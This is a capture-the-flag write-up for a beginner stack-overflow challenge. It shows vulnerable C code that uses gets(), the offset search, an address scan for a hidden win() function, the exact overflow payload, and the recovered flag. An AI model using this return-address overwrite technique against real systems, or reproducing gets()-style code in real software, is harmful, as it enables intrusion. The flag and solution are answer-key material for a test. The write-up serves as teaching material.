# Kuiper Belt Relay Core — pwn (50 points, Beginner)

**Flag:** `CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}` · **Files:** `echo.c`, 774 bytes, sha256 `c1a3f6e2d4b8a9c7e3f1d5b2a8c4e6f9d1b3a7c5e8f2d4b6a9c1e3f5d7b9a2c4`

## Challenge Description

A simple echo service calls `vuln()` with `gets(buffer[64])`. The `win()` function exists but is never called. The goal is to overflow the buffer, override the return address, jump into `win()`, and retrieve the flag.

Source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

## Initial Analysis

- Buffer: `char buffer[64]` at offset 0.
- Boundary scanning via output termination: `"A"*71` → includes `Goodbye!`, `"A"*72` → no `Goodbye!`.
- Return address located at **offset 72** (64 byte buffer + 8 byte saved RBP).
- Binary is x86-64 non-PIE (address scan successful in range 0x40xxxx).

## Exploitation Chain

**Step 1 — Identify return address boundary.**

Send progressively longer payloads and observe when `Goodbye!` disappears from response:

```
"A"*64 → echoes correctly + Goodbye!
"A"*71 → echoes correctly + Goodbye!
"A"*72 → echoes only \n (no Goodbye!)
```

Return address at offset 72.

**Step 2 — Oracle-based scanning to find `win()` address.**

No binary available for static address calculation, so scan server directly in `.text` range: 0x401000–0x401500.

Payload per candidate: `b"A"*72 + low_bytes(addr)` (little-endian, truncate at NUL).

Oracle: response contains "hijacked" or "CSSCTF".

Hit at addr: **0x401216**.

**Step 3 — Construct exploit payload.**

Address 0x401216 < 0x1000000, requiring only 3 bytes: `0x16 0x12 0x40`.

Final payload: `b"A"*72 + b"\x16\x12\x40"`.

**Step 4 — Verification.**

Tested 3 times, all successful.

## Flag

```bash
python exploit.py
```

```
This program is a simple echo service.
Enter your message: You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Reproduce

```bash
python exploit.py
```

Output:
```
This program is a simple echo service.
Enter your message: You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Files

- **exploit.py**: Main exploitation script
- **files/echo.c**: Source code artifact
- **analysis/**: Phase-by-phase exploration scripts

